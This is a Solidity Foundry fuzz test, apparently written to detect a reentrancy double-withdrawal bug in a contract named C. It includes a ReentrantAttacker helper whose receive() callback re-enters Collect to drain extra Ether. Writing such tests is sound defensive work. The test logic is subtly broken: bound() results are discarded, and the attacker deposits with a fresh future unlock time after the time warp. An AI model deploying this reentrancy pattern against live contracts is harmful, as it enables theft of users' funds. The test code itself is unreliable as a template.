pragma solidity ^0.8.0;
import {Test} from "forge-std/Test.sol";
import {C} from "../src/C_under_test.sol";

contract InvMutTest is Test {
    C c;
    function setUp() public { c = new C(address(this)); }
    function testFuzz_property(uint256 unlockTime, uint256 amount) public {
        // Bind to admissible domain: unlockTime in future, amount > 0 and amount >= 2 to enable reentrant double-spend
        bound(unlockTime, block.timestamp + 1, type(uint256).max);
        bound(amount, 2 ether, 100 ether);

        // Deploy reentrant attacker helper
        ReentrantAttacker attacker = new ReentrantAttacker(c, amount);

        // Fund c with enough to satisfy the attacker's single collect amount (c must have >= amount)
        vm.deal(address(this), amount);
        c.Put{value: amount}(unlockTime);

        // Warp past unlockTime so collect is allowed
        vm.warp(unlockTime + 1);

        // Give attacker enough Ether to execute the attack
        vm.deal(address(attacker), amount);

        // Record pre-balance of c
        uint256 preBalance = address(c).balance;

        // Attacker initiates the reentrant attack
        attacker.attack();

        // Post-balance of c
        uint256 postBalance = address(c).balance;

        // Rule: c's balance should not decrease by more than the amount withdrawn by the attacker in a non-reentrant scenario
        // The bug allows reentrant withdrawals depleting c's balance beyond the deposited amount of the attacker.
        // In the reference, only one withdrawal of "amount" succeeds; in the buggy, multiple withdrawals succeed.
        // Assert that the balance after attack is >= preBalance - amount (reference behavior).
        // For the buggy version, postBalance < preBalance - amount, so this fails.
        assertTrue(postBalance >= preBalance - amount);
    }
}

contract ReentrantAttacker {
    C public c;
    uint256 public amount;
    bool private attacking;

    constructor(C _c, uint256 _amount) {
        c = _c;
        amount = _amount;
    }

    function attack() external payable {
        attacking = true;
        // Deposit amount to get a balance in C
        c.Put{value: amount}(block.timestamp + 1000);
        // Warp to make collectible (we assume vm.warp was already called in test)
        // Now trigger Collect, which will call back into receive()
        c.Collect(amount);
        attacking = false;
    }

    receive() external payable {
        if (attacking) {
            // Reenter Collect to double-withdraw
            c.Collect(amount);
        }
    }
}
